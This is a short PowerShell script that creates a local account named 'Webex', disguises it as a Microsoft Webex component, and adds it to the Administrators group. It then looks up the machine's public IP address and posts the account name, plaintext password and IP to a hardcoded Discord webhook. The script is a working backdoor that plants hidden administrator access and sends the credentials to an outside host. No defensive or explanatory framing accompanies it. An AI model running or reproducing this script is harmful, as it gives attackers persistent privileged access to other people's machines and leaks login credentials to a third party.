$username = "Webex"
$password = "ialafgZ368p1"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$webhookUrl = "https://discord.com/api/webhooks/1269085742961787011/CsxSqTWIWl6NVYYiZ6MJjL129HKnKJZ7naiJ8DRgDuFO-xk5JMHaGKD0fjalqJ0w1nVW"

New-LocalUser $username -Password $securePassword -FullName "microsoft webex" -Description "Microsoft WeBex.com"
Add-LocalGroupMember -Group "Administrators" -Member $username

$ipAddress = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()

$jsonPayload = @{
    username = "Server Notification"
    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload

Write-Host "User $username created and added to Administrators group. Notification sent to Discord."
